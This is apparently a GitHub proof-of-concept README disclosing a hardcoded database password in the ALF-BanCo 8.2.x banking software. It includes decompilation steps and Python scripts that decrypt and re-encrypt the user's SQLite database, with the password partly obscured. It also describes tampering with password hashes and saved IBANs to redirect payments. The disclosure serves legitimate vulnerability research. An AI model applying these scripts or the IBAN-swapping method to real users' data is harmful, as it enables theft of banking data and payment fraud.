
[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fph0nkybit%2Fproof-of-concepts%2Ftree%2Fmain%2FUse_Of_Hardcoded_Password_In_ALF-BanCO_8.2.x)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fph0nkybit%2Fproof-of-concepts%2Ftree%2Fmain%2FUse_Of_Hardcoded_Password_In_ALF-BanCO_8.2.x)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Ffiles%2Fdisambiguate&source=header-repo&source_repo=ph0nkybit%2Fproof-of-concepts)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[ph0nkybit](/ph0nkybit)
/
**[proof-of-concepts](/ph0nkybit/proof-of-concepts)**
Public

* [Notifications](/login?return_to=%2Fph0nkybit%2Fproof-of-concepts) You must be signed in to change notification settings
* [Fork
  0](/login?return_to=%2Fph0nkybit%2Fproof-of-concepts)
* [Star
   0](/login?return_to=%2Fph0nkybit%2Fproof-of-concepts)

* [Code](/ph0nkybit/proof-of-concepts)
* [Issues
  0](/ph0nkybit/proof-of-concepts/issues)
* [Pull requests
  0](/ph0nkybit/proof-of-concepts/pulls)
* [Actions](/ph0nkybit/proof-of-concepts/actions)
* [Projects
  0](/ph0nkybit/proof-of-concepts/projects)
* [Security](/ph0nkybit/proof-of-concepts/security)
* [Insights](/ph0nkybit/proof-of-concepts/pulse)

Additional navigation options

* [Code](/ph0nkybit/proof-of-concepts)
* [Issues](/ph0nkybit/proof-of-concepts/issues)
* [Pull requests](/ph0nkybit/proof-of-concepts/pulls)
* [Actions](/ph0nkybit/proof-of-concepts/actions)
* [Projects](/ph0nkybit/proof-of-concepts/projects)
* [Security](/ph0nkybit/proof-of-concepts/security)
* [Insights](/ph0nkybit/proof-of-concepts/pulse)

## Files

 main
## Breadcrumbs

1. [proof-of-concepts](/ph0nkybit/proof-of-concepts/tree/main)
/
# Use\_Of\_Hardcoded\_Password\_In\_ALF-BanCO\_8.2.x

/
## Directory actions

## More options

## Directory actions

## More options

## Latest commit

## History

[History](/ph0nkybit/proof-of-concepts/commits/main/Use_Of_Hardcoded_Password_In_ALF-BanCO_8.2.x) main
## Breadcrumbs

1. [proof-of-concepts](/ph0nkybit/proof-of-concepts/tree/main)
/
# Use\_Of\_Hardcoded\_Password\_In\_ALF-BanCO\_8.2.x

/Top
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| parent directory[..](/ph0nkybit/proof-of-concepts/tree/main) | | |
| [images](/ph0nkybit/proof-of-concepts/tree/main/Use_Of_Hardcoded_Password_In_ALF-BanCO_8.2.x/images "images") | | [images](/ph0nkybit/proof-of-concepts/tree/main/Use_Of_Hardcoded_Password_In_ALF-BanCO_8.2.x/images "images") |  |  |
| [README.md](/ph0nkybit/proof-of-concepts/blob/main/Use_Of_Hardcoded_Password_In_ALF-BanCO_8.2.x/README.md "README.md") | | [README.md](/ph0nkybit/proof-of-concepts/blob/main/Use_Of_Hardcoded_Password_In_ALF-BanCO_8.2.x/README.md "README.md") |  |  |
| [alfbanco\_decrypt.py](/ph0nkybit/proof-of-concepts/blob/main/Use_Of_Hardcoded_Password_In_ALF-BanCO_8.2.x/alfbanco_decrypt.py "alfbanco_decrypt.py") | | [alfbanco\_decrypt.py](/ph0nkybit/proof-of-concepts/blob/main/Use_Of_Hardcoded_Password_In_ALF-BanCO_8.2.x/alfbanco_decrypt.py "alfbanco_decrypt.py") |  |  |
| [alfbanco\_encrypt.py](/ph0nkybit/proof-of-concepts/blob/main/Use_Of_Hardcoded_Password_In_ALF-BanCO_8.2.x/alfbanco_encrypt.py "alfbanco_encrypt.py") | | [alfbanco\_encrypt.py](/ph0nkybit/proof-of-concepts/blob/main/Use_Of_Hardcoded_Password_In_ALF-BanCO_8.2.x/alfbanco_encrypt.py "alfbanco_encrypt.py") |  |  |
| View all files | | |

## [README.md](#readme)

## Overview

ALF-BanCo is a homebanking software that manages accounts in various banks, Paypal accounts and many credit cards. The software saves transactions on the PC for as long as the user requires.

## Discovered By

**[Nicolò Tescari](https://www.linkedin.com/in/nicol%C3%B2-tescari-913390131/) ([@ph0nkybit](https://twitter.com/ph0nkybit))** of **[Cybertech](https://www.cybertech.eu/)**

## Proof of Concept (PoC)

The application uses a hardcoded default password to encrypt the local SQLite database containing the user's data. An attacker who gains physical or remote access to the user's machine can exploit this vulnerability to read and modify the data.

The vulnerability was discovered on **ALF-BanCO 8.2.3 (Profi version)**. According to the vendor, it is present up to version **8.2.5**. A patch has been released starting with version **8.3.0**.

At the request of the vendor, the password has been partially obscured.

---

After installing the application and configuring our user, the file “**HbDat001.alfdb8**” is created inside the following path: “**C:\Users\<username>\AppData\Roaming\ALFBanCo8\Daten**”.

[![db_path](https://raw.githubusercontent.com/ph0nkybit/proof-of-concepts/main/Use_Of_Hardcoded_Password_In_ALF-BanCO_8.2.x/images/db_path.png)](https://raw.githubusercontent.com/ph0nkybit/proof-of-concepts/main/Use_Of_Hardcoded_Password_In_ALF-BanCO_8.2.x/images/db_path.png)

Using ILSpy , the various DLL libraries and application executables inside “**C:\Program Files (x86)\ALFBanCo8**” were decompiled.

Looking for the extension "**.alfdb8**" we notice that this is assigned to the “**DB\_ENDING**” constant, inside “**AlfOption.dll**”. This suggests that the file is used as a database.

[![DB_ENDING](https://github.com/ph0nkybit/proof-of-concepts/raw/main/Use_Of_Hardcoded_Password_In_ALF-BanCO_8.2.x/images/DB_ENDING.png)](https://github.com/ph0nkybit/proof-of-concepts/blob/main/Use_Of_Hardcoded_Password_In_ALF-BanCO_8.2.x/images/DB_ENDING.png)

Moreover, the “**IsSqliteDB**” function, inside “**AlfLogin.dll**” returns **true** if the file extension is “**.alfdb8**”, confirming that “**HbDat001.alfdb8”** is a SQLite DB.

[![IsSqliteDB](https://raw.githubusercontent.com/ph0nkybit/proof-of-concepts/main/Use_Of_Hardcoded_Password_In_ALF-BanCO_8.2.x/images/IsSqliteDB.png)](https://raw.githubusercontent.com/ph0nkybit/proof-of-concepts/main/Use_Of_Hardcoded_Password_In_ALF-BanCO_8.2.x/images/IsSqliteDB.png)

As we can see the database cannot be simply opened by an application like DB Browser for SQLite because it is probably encrypted.

[![DBBrowser](https://raw.githubusercontent.com/ph0nkybit/proof-of-concepts/main/Use_Of_Hardcoded_Password_In_ALF-BanCO_8.2.x/images/DB_Browser.png)](https://raw.githubusercontent.com/ph0nkybit/proof-of-concepts/main/Use_Of_Hardcoded_Password_In_ALF-BanCO_8.2.x/images/DB_Browser.png)

Within the “**AlfNetDB.dll**” library, we notice the “**OpenSQLite**” function, which takes as arguments two strings, the **db** and the **password**.

[![OpenSQLite](https://raw.githubusercontent.com/ph0nkybit/proof-of-concepts/main/Use_Of_Hardcoded_Password_In_ALF-BanCO_8.2.x/images/OpenSQLite.png)](https://raw.githubusercontent.com/ph0nkybit/proof-of-concepts/main/Use_Of_Hardcoded_Password_In_ALF-BanCO_8.2.x/images/OpenSQLite.png)

The function is used by the the following constructor, whose variable “**bSQLCrypt**” is set to **true**. This confirms that the database is probably encrypted.

[![bSQLCrypt](https://raw.githubusercontent.com/ph0nkybit/proof-of-concepts/main/Use_Of_Hardcoded_Password_In_ALF-BanCO_8.2.x/images/bSQLCrypt.png)](https://raw.githubusercontent.com/ph0nkybit/proof-of-concepts/main/Use_Of_Hardcoded_Password_In_ALF-BanCO_8.2.x/images/bSQLCrypt.png)

The constructor, is in turn used by the “**SQLCheckPassword**” function, inside “**AlfLogin.dll**”.

As we can see, there’s a **hardcoded password** among the arguments of the constructor.

[![SQLCheckPassword](https://raw.githubusercontent.com/ph0nkybit/proof-of-concepts/main/Use_Of_Hardcoded_Password_In_ALF-BanCO_8.2.x/images/SQLCheckPassword.png)](https://raw.githubusercontent.com/ph0nkybit/proof-of-concepts/main/Use_Of_Hardcoded_Password_In_ALF-BanCO_8.2.x/images/SQLCheckPassword.png)

Looking for the password, we can see that it is in fact assigned to the **DB\_PWD** constant within the “**Procs”** class of the same DLL.

[![DB_PWD](https://raw.githubusercontent.com/ph0nkybit/proof-of-concepts/main/Use_Of_Hardcoded_Password_In_ALF-BanCO_8.2.x/images/DB_PWD.png)](https://raw.githubusercontent.com/ph0nkybit/proof-of-concepts/main/Use_Of_Hardcoded_Password_In_ALF-BanCO_8.2.x/images/DB_PWD.png)

Returning to the “**OpenSQLite**” function, we also note that the “**System.Data.SQLite**” library is being used. This library also provides support for encrypting SQLite databases and as we will see below this type of encryption is actually used on the "**HbDat001.alfdb8**" database.

[![System.Data.SQLite](https://raw.githubusercontent.com/ph0nkybit/proof-of-concepts/main/Use_Of_Hardcoded_Password_In_ALF-BanCO_8.2.x/images/System.Data.SQLite.png)](https://raw.githubusercontent.com/ph0nkybit/proof-of-concepts/main/Use_Of_Hardcoded_Password_In_ALF-BanCO_8.2.x/images/System.Data.SQLite.png)

The following Python script can be used to decrypt the database.

Copying “**HbDat001.alfdb8**” to a new directory and running the script, creates “**HbDat001.sqlite**” in the same directory (thanks to <https://gist.github.com/zuccaro> for the original Python code).

```
def decryptSystemDataSQLite(file, password):

    from Crypto.Hash import SHA
    from Crypto.Cipher import ARC4
    from struct import unpack
    from tempfile import NamedTemporaryFile
    from shutil import copyfile
    from os import remove
    ret = None
    with open(file,'rb') as f:
        key = SHA.new(password).digest()[:16]
        header = ARC4.new(key).decrypt(f.read(1024))
        if header[0:15] == 'SQLite format 3':
            declared_ps = unpack('>H',header[16:18])[0]
            if declared_ps == 1:
                declared_ps = 65536
            t = NamedTemporaryFile(delete=False,suffix='.sqlite')
            f.seek(0)
            while True:
                block = f.read(declared_ps)
                if not block:
                    break
                t.write(ARC4.new(key).decrypt(block))
            t.close()
            ret = t.name
            copyfile(ret, file.split('.')[0] + '.sqlite')
            remove(ret)
    return ret

decryptSystemDataSQLite('HbDat001.alfdb8','Wbf*************')

```

[![example_usage](https://raw.githubusercontent.com/ph0nkybit/proof-of-concepts/main/Use_Of_Hardcoded_Password_In_ALF-BanCO_8.2.x/images/example_usage.png)](https://raw.githubusercontent.com/ph0nkybit/proof-of-concepts/main/Use_Of_Hardcoded_Password_In_ALF-BanCO_8.2.x/images/example_usage.png)

Within the database we can find information about the transfers made.

[![database_transfers](https://raw.githubusercontent.com/ph0nkybit/proof-of-concepts/main/Use_Of_Hardcoded_Password_In_ALF-BanCO_8.2.x/images/database_transfers.png)](https://raw.githubusercontent.com/ph0nkybit/proof-of-concepts/main/Use_Of_Hardcoded_Password_In_ALF-BanCO_8.2.x/images/database_transfers.png)

Accounts data.

[![database_accounts](https://raw.githubusercontent.com/ph0nkybit/proof-of-concepts/main/Use_Of_Hardcoded_Password_In_ALF-BanCO_8.2.x/images/database_accounts.png)](https://raw.githubusercontent.com/ph0nkybit/proof-of-concepts/main/Use_Of_Hardcoded_Password_In_ALF-BanCO_8.2.x/images/database_accounts.png)

The username and password hash used by the user to login into the application.

[![database_credentials](https://raw.githubusercontent.com/ph0nkybit/proof-of-concepts/main/Use_Of_Hardcoded_Password_In_ALF-BanCO_8.2.x/images/database_credentials.png)](https://raw.githubusercontent.com/ph0nkybit/proof-of-concepts/main/Use_Of_Hardcoded_Password_In_ALF-BanCO_8.2.x/images/database_credentials.png)

In addition to being able to read user data, an attacker could also copy the “**HbDat001.alfdb8**” file on his machine, decrypt it, change the password hash on the database with one of his choise, re-encrypt the database, download the application and choose to restore from a backup during the initial setup, to access the victim’s data from the application without knowing the user's password.

The following Python script can be used to re-encrypt the database.

```
def encryptSystemDataSQLite(file, password):

    from Crypto.Hash import SHA
    from Crypto.Cipher import ARC4
    from struct import unpack
    from tempfile import NamedTemporaryFile
    from shutil import copyfile
    from os import remove
    ret = None
    with open(file,'rb') as f:
        key = SHA.new(password).digest()[:16]
        header = (f.read(1024))
        declared_ps = unpack('>H',header[16:18])[0]
        if declared_ps == 1:
            declared_ps = 65536
        t = NamedTemporaryFile(delete=False,suffix='.alfdb8')
        f.seek(0)
        while True:
            block = f.read(declared_ps)
            if not block:
                break
            t.write(ARC4.new(key).encrypt(block))
        t.close()
        ret = t.name
        copyfile(ret, file.split('.')[0] + '.alfdb8')
        remove(ret)
    return ret

encryptSystemDataSQLite('HbDat001.sqlite','Wbf*************')

```

The malicious user could also carry out phishing attacks by modifying IBANs (for example in transactions saved as favorites), re-encrypting the database and replacing it with the user's legitimate one. If when the user send a payment he does not notice that the IBANs of a transaction saved as a favorite have been replaced, he could send the payment to the wrong IBAN.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.

